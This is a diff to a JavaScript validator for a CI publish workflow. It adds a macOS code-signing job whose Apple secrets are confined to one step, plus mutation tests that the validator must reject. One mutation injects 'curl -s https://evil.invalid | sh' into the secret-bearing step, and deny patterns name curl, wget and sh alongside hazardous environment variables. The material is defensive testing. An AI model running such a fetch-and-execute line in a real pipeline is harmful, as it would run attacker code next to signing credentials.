@@ -40,7 +40,20 @@ export const UPLOAD_STEPS = [
 const HAZARD_ENV = /^(?:NODE_OPTIONS|NODE_PATH|PATH|LD_[A-Z_]+|DYLD_[A-Z_]+|BASH_ENV|ENV|SHELLOPTS|PS4|GITHUB_(?:ENV|PATH)|NPM_CONFIG_.*|.*_OPTIONS)$/i;
 const SEAL_CHECK_RUN = "node scripts/ci/upload.mjs run --dry-run";
 const SEAL_CHECK_ACTIONS = ["actions/checkout@", "actions/setup-node@", "actions/download-artifact@", "actions/upload-artifact@"];
-const ALL_JOBS = ["guard", "plan", "pack", "verify", "seal-check", "upload"];
+const ALL_JOBS = ["guard", "plan", "sign-swap", "pack", "verify", "seal-check", "upload"];
+// sign-swap signs one binary (rightkit-swap) for @rightkit/release. It is the only job besides upload that may use an
+// environment or the secrets context, and then only the three Apple identity secrets, in exactly one step; the build
+// that produces the binary runs before that step and holds no secret. pack stays secretless and only downloads the result.
+export const SIGN_SWAP_IF = "${{ needs.plan.outputs.count != '0' && needs.plan.outputs.registry == 'npm' && contains(needs.plan.outputs.units, '@rightkit/release') }}";
+export const SIGN_SWAP_SECRETS = {
+  APPLE_CERTIFICATE_BASE64: "${{ secrets.APPLE_CERTIFICATE_BASE64 }}",
+  APPLE_CERTIFICATE_PASSWORD: "${{ secrets.APPLE_CERTIFICATE_PASSWORD }}",
+  APPLE_KEYCHAIN_PASSWORD: "${{ secrets.APPLE_KEYCHAIN_PASSWORD }}",
+};
+export const SIGN_SWAP_ARTIFACT = "rightkit-swap-signed";
+export const PACK_IF = "${{ always() && needs.guard.result == 'success' && needs.plan.result == 'success' && needs.plan.outputs.count != '0' && (needs.sign-swap.result == 'success' || needs.sign-swap.result == 'skipped') }}";
+const PACK_SWAP_STEP_IF = "${{ needs.sign-swap.result == 'success' }}";
+const SIGNING_TOOLS = /\b(?:codesign|notarytool|security\s+(?:import|create-keychain|unlock-keychain|set-key-partition-list)|cargo\b)/;
 
 const same = (a, b) => JSON.stringify(a) === JSON.stringify(b);
 const sorted = (list) => [...list].sort();
@@ -89,6 +102,7 @@ export function assertPublishDoc(doc, name = "publish.yml") {
   check(doc?.concurrency?.["cancel-in-progress"] === "false", "a publish must never be cancelled half-way");
   check(same(sorted(Object.keys(jobs)), sorted(ALL_JOBS)), `jobs must be exactly ${ALL_JOBS.join(", ")}`);
   const { guard, plan, pack, verify, upload } = jobs;
+  const signSwap = jobs["sign-swap"];
   const sealCheck = jobs["seal-check"];
   const rest = { ...doc }; delete rest.jobs;
   check(findMatches(rest, SECRET_PATTERN).length === 0 && findMatches(rest, ID_TOKEN_PATTERN).length === 0, `no secret or id-token outside a job (${[...findMatches(rest, SECRET_PATTERN), ...findMatches(rest, ID_TOKEN_PATTERN)].map((h) => h.path).join(", ")})`);
@@ -112,12 +126,15 @@ export function assertPublishDoc(doc, name = "publish.yml") {
   check(same(sorted(verify?.strategy?.matrix?.os ?? []), VERIFY_HOSTS), `verify must run on exactly ${VERIFY_HOSTS.join(" and ")}`);
   check(verify?.strategy?.matrix && !("exclude" in verify.strategy.matrix) && !("include" in verify.strategy.matrix), "verify matrix must not exclude or include legs");
   check(verify?.["runs-on"] === "${{ matrix.os }}", "verify must run on the matrix host");
+  for (const needed of ["guard", "plan", "sign-swap"]) check(needsOf(pack).includes(needed), `pack must need ${needed}`);
   for (const needed of ["guard", "plan", "pack"]) check(needsOf(verify).includes(needed), `verify must need ${needed}`);
   for (const needed of ["verify", "pack", "plan"]) check(needsOf(sealCheck).includes(needed), `seal-check must need ${needed}`);
   for (const needed of ["guard", "plan", "pack", "verify", "seal-check"]) check(needsOf(upload).includes(needed), `upload must need ${needed}`);
-  for (const [jobName, job] of [["verify", verify], ["pack", pack], ["seal-check", sealCheck]]) {
+  for (const [jobName, job] of [["verify", verify], ["seal-check", sealCheck]]) {
     check(job?.if === "${{ needs.plan.outputs.count != '0' }}", `${jobName} may be skipped only when the plan is empty`);
   }
+  // pack runs after sign-swap succeeded or was skipped (a crates run, or a run without @rightkit/release), never after it failed.
+  check(typeof pack?.if === "string" && pack.if.trim() === PACK_IF, `pack's condition must be exactly ${PACK_IF}`);
   const verifyRuns = stepsOf(verify).map((s) => s.run ?? "");
   const gateAt = verifyRuns.findIndex((r) => /node scripts\/ci\/gate\.mjs --registry /.test(r) && /--allow-host-exclusion/.test(r) && /--allow-no-test/.test(r));
   const receiptAt = verifyRuns.findIndex((r) => /node scripts\/ci\/publish\.mjs verify/.test(r));
@@ -131,10 +148,11 @@ export function assertPublishDoc(doc, name = "publish.yml") {
   // Secrets and id-token exist only in upload, and nothing else is privileged.
   for (const [jobName, job] of Object.entries(jobs)) {
     if (jobName === "upload") continue;
+    const isSign = jobName === "sign-swap";
     const secretHits = findMatches(job, SECRET_PATTERN); const idHits = findMatches(job, ID_TOKEN_PATTERN);
-    check(secretHits.length === 0, `${jobName} must not reference the secrets context in any form (${secretHits.map((h) => h.path).join(", ")})`);
+    if (!isSign) check(secretHits.length === 0, `${jobName} must not reference the secrets context in any form (${secretHits.map((h) => h.path).join(", ")})`);
     check(idHits.length === 0, `${jobName} must not request id-token (${idHits.map((h) => h.path).join(", ")})`);
-    check(job.environment === undefined, `${jobName} must not use an environment`);
+    if (!isSign) check(job.environment === undefined, `${jobName} must not use an environment`);
     check(job.env === undefined && job.uses === undefined && job.secrets === undefined, `${jobName} has no job-level env, uses or secrets`);
     check(job.permissions === undefined || same(job.permissions, { contents: "read" }), `${jobName} permissions must be contents: read`);
   }
@@ -191,6 +209,39 @@ export function assertPublishDoc(doc, name = "publish.yml") {
   check(tokenSteps.every(({ own }) => own.length === 1), "each upload step may read exactly one token");
   check(npmStep?.if?.trim() === NPM_STEP_IF && cratesStep?.if?.trim() === CRATES_STEP_IF, "each token step must run only for its own registry (exact condition)");
   check(tokenSteps.every(({ step }) => step.run?.trim() === "node scripts/ci/upload.mjs run"), "a token step may only run the upload script");
+
+  // sign-swap: the one other job that holds a secret. Exactly one step reads exactly the three Apple identity secrets,
+  // after the build; nothing else is privileged; the signed bytes leave only as the rightkit-swap-signed artifact.
+  const signSteps = stepsOf(signSwap);
+  check(signSwap?.environment === "release", "sign-swap must use environment: release");
+  check(same(signSwap?.permissions, { contents: "read" }), "sign-swap permissions must be exactly contents: read (no id-token)");
+  check(typeof signSwap?.if === "string" && signSwap.if.trim() === SIGN_SWAP_IF, `sign-swap's condition must be exactly ${SIGN_SWAP_IF}`);
+  check(signSwap?.["runs-on"] === "xcode-27", "sign-swap runs on the macOS signing host xcode-27");
+  check(needsOf(signSwap).includes("guard") && needsOf(signSwap).includes("plan"), "sign-swap must need guard and plan");
+  const signSecretRefs = findMatches(signSwap, SECRET_PATTERN);
+  const secretStepIndexes = [...new Set(signSecretRefs.map((h) => Number(/^\.steps\[(\d+)\]/.exec(h.path)?.[1] ?? -1)))];
+  check(signSecretRefs.every((h) => /^\.steps\[\d+\]\.env\.[A-Z0-9_]+$/.test(h.path)), `sign-swap may read the secrets context only as step env values (found ${signSecretRefs.map((h) => h.path).join(", ")})`);
+  check(secretStepIndexes.length === 1 && secretStepIndexes[0] >= 0, "sign-swap must read secrets in exactly one step");
+  const keychainStep = signSteps[secretStepIndexes[0]];
+  check(keychainStep && same(sorted(Object.keys(keychainStep.env ?? {})), sorted(Object.keys(SIGN_SWAP_SECRETS))) && Object.entries(SIGN_SWAP_SECRETS).every(([k, v]) => String(keychainStep.env[k]).trim() === v), "the sign-swap secret step must read exactly APPLE_CERTIFICATE_BASE64, APPLE_CERTIFICATE_PASSWORD and APPLE_KEYCHAIN_PASSWORD from the same-named secrets");
+  check(keychainStep?.uses === undefined && keychainStep?.if === undefined && !/cargo|curl|wget|node|pnpm|npm|\bsh\b/.test(keychainStep?.run ?? ""), "the sign-swap secret step may only run keychain commands, with no condition");
+  const buildAt = signSteps.findIndex((s) => /cargo build /.test(s.run ?? ""));
+  check(buildAt >= 0 && buildAt < secretStepIndexes[0] && signSteps[buildAt].env === undefined && /-p rightkit-fs --bin rightkit-swap/.test(signSteps[buildAt].run), "sign-swap must build rightkit-fs's rightkit-swap before any secret is read, in a step with no env");
+  check(signSteps.every((s, i) => i === secretStepIndexes[0] || !/\bsecurity\s+(?:import|create-keychain)\b/.test(s.run ?? "")), "only the secret step may import the signing identity");
+  const codesignStep = signSteps.find((s) => /codesign --force/.test(s.run ?? ""));
+  check(codesignStep && same(Object.keys(codesignStep.env ?? {}), ["APPLE_DEVELOPER_ID"]) && codesignStep.env.APPLE_DEVELOPER_ID === "${{ vars.APPLE_DEVELOPER_ID }}" && /--options runtime/.test(codesignStep.run) && /--timestamp/.test(codesignStep.run) && /codesign --verify --strict/.test(codesignStep.run) && /shasum -a 256/.test(codesignStep.run), "sign-swap must sign with --options runtime --timestamp as vars.APPLE_DEVELOPER_ID, verify with --strict and record the sha256");
+  check(signSteps.some((s) => /security delete-keychain/.test(s.run ?? "") && s.if?.trim() === "${{ always() }}"), "sign-swap must remove the keychain in an always() step");
+  const handOver = signSteps.filter((s) => /^actions\/upload-artifact@/.test(s.uses ?? ""));
+  check(handOver.length === 1 && handOver[0].with?.name === SIGN_SWAP_ARTIFACT && handOver[0].with?.path === `${RT}/swap-signed`, `sign-swap must hand over exactly ${RT}/swap-signed as the ${SIGN_SWAP_ARTIFACT} artifact`);
+  check(signSteps.every((s) => !s.uses || /^(?:actions\/(?:checkout|upload-artifact)|dtolnay\/rust-toolchain)@/.test(s.uses)), "sign-swap may use only checkout, the Rust toolchain and upload-artifact");
+  // pack is secretless and consumes the signed helper only by download.
+  const packSwapDownload = stepsOf(pack).filter((s) => /^actions\/download-artifact@/.test(s.uses ?? "") && s.with?.name === SIGN_SWAP_ARTIFACT);
+  check(packSwapDownload.length === 1 && packSwapDownload[0].if?.trim() === PACK_SWAP_STEP_IF && same(sorted(Object.keys(packSwapDownload[0].with)), ["name", "path"]) && packSwapDownload[0].with.path === `${RT}/swap-signed`, `pack must download ${SIGN_SWAP_ARTIFACT} into ${RT}/swap-signed with only name and path, only when sign-swap succeeded`);
+  const packSigningRuns = stepsOf(pack).filter((s) => SIGNING_TOOLS.test(s.run ?? ""));
+  check(packSigningRuns.length === 0, `pack must not sign or build the helper itself (${packSigningRuns.map((s) => s.name ?? s.run).join(", ")})`);
+  const placeAt = stepsOf(pack).findIndex((s) => /install -m 0755 [^\n]*packages\/release\/bin\/darwin\/rightkit-swap/.test(s.run ?? "") && /sha256sum -c/.test(s.run ?? ""));
+  const packAt = stepsOf(pack).findIndex((s) => /node scripts\/ci\/publish\.mjs pack/.test(s.run ?? ""));
+  check(placeAt >= 0 && stepsOf(pack)[placeAt].if?.trim() === PACK_SWAP_STEP_IF && placeAt < packAt, "pack must re-check the helper's sha256, place it at packages/release/bin/darwin/rightkit-swap and do so before it packs");
 
   // The dry run: same script, no secret, no id-token, nothing sent.
   const dryStep = stepsOf(sealCheck).find((s) => s.run?.trim() === SEAL_CHECK_RUN);
@@ -338,6 +389,32 @@ export const MUTATIONS = [
   ["upload gains job outputs", edit((j) => { j.upload.outputs = { x: "${{ steps.a.outputs.b }}" }; })],
   ["upload gains a concurrency group", edit((j) => { j.upload.concurrency = "x"; })],
   ["upload gains a display name that is a key outside the list", edit((j) => { j.upload["runs-on-labels"] = ["self-hosted"]; })],
+  // sign-swap and the secretless pack.
+  ["the signing secret leaks into pack", edit((j) => { j.pack.steps.at(-2).env = { ...(j.pack.steps.at(-2).env ?? {}), APPLE_CERTIFICATE_BASE64: "${{ secrets.APPLE_CERTIFICATE_BASE64 }}" }; })],
+  ["pack joins the release environment", edit((j) => { j.pack.environment = "release"; })],
+  ["pack builds the swap itself", edit((j) => { j.pack.steps.splice(-1, 0, { name: "build swap", run: "cargo build --release -p rightkit-fs --bin rightkit-swap" }); })],
+  ["pack signs the swap itself", edit((j) => { j.pack.steps.splice(-1, 0, { name: "sign", run: "codesign --force --sign - packages/release/bin/darwin/rightkit-swap" }); })],
+  ["pack downloads the swap from another run", edit((j) => { j.pack.steps.find((s) => s.with?.name === SIGN_SWAP_ARTIFACT).with["run-id"] = "1"; })],
+  ["pack downloads the swap with a token", edit((j) => { j.pack.steps.find((s) => s.with?.name === SIGN_SWAP_ARTIFACT).with["github-token"] = "${{ secrets.NPM_TOKEN }}"; })],
+  ["pack stops re-checking the swap hash", edit((j) => { const s = j.pack.steps.find((x) => /install -m 0755/.test(x.run ?? "")); s.run = s.run.replace("sha256sum -c", "true"); })],
+  ["pack places the swap after packing", edit((j) => { const i = j.pack.steps.findIndex((x) => /install -m 0755/.test(x.run ?? "")); const [x] = j.pack.steps.splice(i, 1); j.pack.steps.splice(-1, 0, x); })],
+  ["pack no longer needs sign-swap", edit((j) => { j.pack.needs = j.pack.needs.filter((n) => n !== "sign-swap"); })],
+  ["pack runs after a failed sign-swap", edit((j) => { j.pack.if = j.pack.if.replace(" && (needs.sign-swap.result == 'success' || needs.sign-swap.result == 'skipped')", ""); })],
+  ["pack no longer needs a green plan", edit((j) => { j.pack.if = j.pack.if.replace("needs.plan.result == 'success' && ", ""); })],
+  ["sign-swap reads the npm token", edit((j) => { j["sign-swap"].steps.find((s) => s.env?.APPLE_CERTIFICATE_BASE64).env.NODE_AUTH_TOKEN = "${{ secrets.NPM_TOKEN }}"; })],
+  ["sign-swap reads a secret in a second step", edit((j) => { j["sign-swap"].steps.find((s) => /codesign --force/.test(s.run ?? "")).env.X = "${{ secrets.APPLE_KEYCHAIN_PASSWORD }}"; })],
+  ["the swap build step gets a secret", edit((j) => { j["sign-swap"].steps.find((s) => /cargo build /.test(s.run ?? "")).env = { T: "${{ secrets.APPLE_CERTIFICATE_PASSWORD }}" }; })],
+  ["sign-swap builds after the secret step", edit((j) => { const i = j["sign-swap"].steps.findIndex((s) => /cargo build /.test(s.run ?? "")); const [x] = j["sign-swap"].steps.splice(i, 1); const k = j["sign-swap"].steps.findIndex((s) => s.env?.APPLE_CERTIFICATE_BASE64); j["sign-swap"].steps.splice(k + 1, 0, x); })],
+  ["sign-swap requests id-token", edit((j) => { j["sign-swap"].permissions = { contents: "read", "id-token": "write" }; })],
+  ["sign-swap loses its environment", edit((j) => { delete j["sign-swap"].environment; })],
+  ["sign-swap runs on another host", edit((j) => { j["sign-swap"]["runs-on"] = "ubuntu-24.04"; })],
+  ["sign-swap runs for crates runs too", edit((j) => { j["sign-swap"].if = "${{ needs.plan.outputs.count != '0' }}"; })],
+  ["sign-swap uses another identity", edit((j) => { j["sign-swap"].steps.find((s) => /codesign --force/.test(s.run ?? "")).env.APPLE_DEVELOPER_ID = "-"; })],
+  ["sign-swap drops the hardened runtime", edit((j) => { const s = j["sign-swap"].steps.find((x) => /codesign --force/.test(x.run ?? "")); s.run = s.run.replace(" --options runtime", ""); })],
+  ["sign-swap keeps the keychain", edit((j) => { j["sign-swap"].steps = j["sign-swap"].steps.filter((s) => !/security delete-keychain/.test(s.run ?? "")); })],
+  ["sign-swap uses an unlisted action", edit((j) => { j["sign-swap"].steps.splice(2, 0, actionStep("pnpm/action-setup@0977fd99725f1db4007ccb2928dbb4e90d06cc86")); })],
+  ["sign-swap hands over another path", edit((j) => { j["sign-swap"].steps.find((s) => /upload-artifact/.test(s.uses ?? "")).with.path = "target"; })],
+  ["sign-swap secret step runs downloaded code", edit((j) => { j["sign-swap"].steps.find((s) => s.env?.APPLE_CERTIFICATE_BASE64).run += "\ncurl -s https://evil.invalid | sh"; })],
   ["plan's dry_run output is rewritten", edit((j) => { j.plan.outputs.dry_run = "false"; })],
 ];
 
